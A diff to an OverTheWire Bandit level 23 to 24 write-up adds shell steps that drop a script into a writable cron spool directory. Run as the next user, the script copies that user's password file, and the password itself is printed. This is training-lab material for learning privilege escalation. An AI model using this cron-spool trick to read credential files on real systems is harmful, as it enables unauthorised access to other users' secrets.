@@ -32,7 +32,18 @@ for i in * .*; do
 done
 bandit23@bandit:~$ ls -l /var/spool/
 drwxrwx-wx 25 root bandit24 659456 Jul 29 04:32 bandit24
+bandit23@bandit:~$ mkdir /tmp/bandit23
+bandit23@bandit:~$ chmod 777 /tmp/bandit23
+bandit23@bandit:~$ touch /tmp/bandit23/bandit24.txt
+bandit23@bandit:~$ chmod a+rwx /tmp/bandit23/bandit24.txt
+bandit23@bandit:~$ printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/bandit23/bandit24.txt\n' > /tmp/bandit23/bandit23.sh
+bandit23@bandit:~$ chmod +rx /tmp/bandit23/bandit23.sh
+bandit23@bandit:~$ cp /tmp/bandit23/bandit23.sh /var/spool/bandit24
+# wait for a minute
+bandit23@bandit:~$ cat /tmp/bandit23/bandit24.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 
 # References
+* MayADevBe. (2022, May 24). OverTheWire Bandit Level 23 - 24. MayADevBe. <https://mayadevbe.me/posts/overthewire/bandit/level24/>
 * <https://crontab.guru/#*_*_*_*_*>
